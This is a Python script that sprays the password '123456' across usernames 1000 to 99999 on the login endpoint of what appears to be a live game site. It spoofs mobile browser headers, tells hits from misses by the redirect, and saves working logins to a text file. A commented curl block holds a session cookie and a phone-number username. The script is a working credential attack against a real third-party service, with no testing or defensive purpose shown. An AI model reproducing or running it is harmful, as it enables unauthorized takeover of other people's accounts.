import requests
import urllib.parse
import time
from bs4 import BeautifulSoup


def getHtml():
    BASE_URL = 'http://ms31.haixing8.cn/login.php?d=login.log&cid=0&stateid=1&u=21367898&s={}'  # 21758788
    login_url = 'http://ms.haixing8.cn/commreg/channel.php?d=login.startover&spid=&clienttype=WAP2'
    headers = {
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'Origin': 'http://92msjs.com',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 XL Build/OPD1.170816.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Referer': 'http://92msjs.com/commreg/channel.php?d=login.start&clienttype=WAP2',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,nl;q=0.7,zh-TW;q=0.6',
        # 'Cookie': 'ms_user_name=13300000000; clienttype=WAP2; PHPSESSID=me979ih369ropj3c3in7fpaa06'
    }
    # username : 3-13 数字或字母
    # password : 4-20 数字或字母
    mapList = list(range(1000, 100000))
    for i in mapList:
        payload = {'username': i,
                   'password': '123456', 'submit': r'%E7%A1%AE%E5%AE%9A'}
        html = requests.post(login_url, headers=headers,
                             data=payload, allow_redirects=False)
        result = valid(html.headers['Location'])
        mark = "id:{},login {}".format(i, result)
        print(mark)
        if result == "SUCCESS":
            with open('msjs-username-password.txt', 'a', encoding='utf-8') as f:
                f.write(mark + '\n')


def valid(location_url):
    if 'regselectsvr' in location_url:
        return ('SUCCESS')
    elif 'err_msg' in location_url:
        return ('FAILURE')
    else:
        return ('NONE!')


if __name__ == "__main__":

    getHtml()

    # loca = 'http://ms.haixing8.cn/commreg/channel.php?d=login.regselectsvr&u=21367898&gmsid=6953c9692492f0404e25bf90b016be85&clienttype=WAP2'
    # loca = 'http://ms.haixing8.cn/commreg/channel.php?d=login.start&spid=&clienttype=WAP2&show_err=1023&err_msg=%E6%82%A8%E8%BE%93%E5%85%A5%E7%9A%84%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF%EF%BC%8C%E8%AF%B7%E9%87%8D%E6%96%B0%E8%BE%93%E5%85%A5%EF%BC%884-20%E4%B8%AA%E6%95%B0%E5%AD%97%E6%88%96%E5%AD%97%E7%AC%A6%EF%BC%89'
    # valid(loca)


''' CURL
curl -Ls -w %{url_effective} -o /dev/null 'http://ms.haixing8.cn/commreg/channel.php?d=login.startover&spid=&clienttype=WAP2'
-H 'Connection: keep-alive'
-H 'Pragma: no-cache'
-H 'Cache-Control: no-cache'
-H 'Origin: http://92msjs.com'
-H 'Upgrade-Insecure-Requests: 1'
-H 'Content-Type: application/x-www-form-urlencoded'
-H 'User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 XL Build/OPD1.170816.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Mobile Safari/537.36'
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
-H 'Referer: http://92msjs.com/commreg/channel.php?d=login.start&clienttype=WAP2'
-H 'Accept-Encoding: gzip, deflate'
-H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,nl;q=0.7,zh-TW;q=0.6'
-H 'Cookie: ms_user_name=13300000000; clienttype=WAP2; PHPSESSID=me979ih369ropj3c3in7fpaa06'
--data 'username=13300000000&password=000000&submit=%E7%A1%AE%E5%AE%9A'
--compressed
http://ms.haixing8.cn/commreg/channel.php?d=login.regselectsvr&u=21367898&gmsid=0f96b261ec3376d5a0746e11ddd7ae80&clienttype=WAP2%
'''

'''example
def yunsite():
'url'
headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate, sdch, br',
           'Accept-Language': 'zh-CN,zh;q=0.8',
           'Connection': 'keep-alive',
           'Host': 'pan.baidu.com',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}

url = 'https://pan.baidu.com/s/1c0rjnbi'
html = requests.get(url, headers=headers, allow_redirects=False)
return html.headers['Location']
'''
